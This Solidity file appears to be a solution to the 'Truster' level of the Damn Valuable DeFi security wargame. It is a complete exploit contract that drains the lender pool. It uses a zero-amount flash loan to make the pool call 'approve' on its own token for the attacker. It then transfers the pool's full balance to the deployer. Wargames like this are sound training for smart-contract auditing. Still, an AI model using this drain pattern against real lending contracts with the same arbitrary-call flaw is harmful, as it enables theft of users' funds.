// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "../truster/TrusterLenderPool.sol";
import "solmate/src/tokens/ERC20.sol";

contract TrusterLenderDrainer {
    TrusterLenderPool internal _trusterLenderPool;
    DamnValuableToken internal _damnValuableToken;
    address internal _drainedFundsReceiver;

    constructor(TrusterLenderPool _pool, DamnValuableToken _dvt) {
        _trusterLenderPool = _pool;
        _damnValuableToken = _dvt;
        _drainedFundsReceiver = msg.sender;
    }

    function drainTrusterLender() external {
        bytes memory approveDVT = abi.encodeCall(ERC20.approve, (address(this), type(uint256).max));
        _trusterLenderPool.flashLoan(0, address(this), address(_damnValuableToken), approveDVT);
        _damnValuableToken.transferFrom(
            address(_trusterLenderPool),
            _drainedFundsReceiver,
            _damnValuableToken.balanceOf(address(_trusterLenderPool))
        );
    }
}
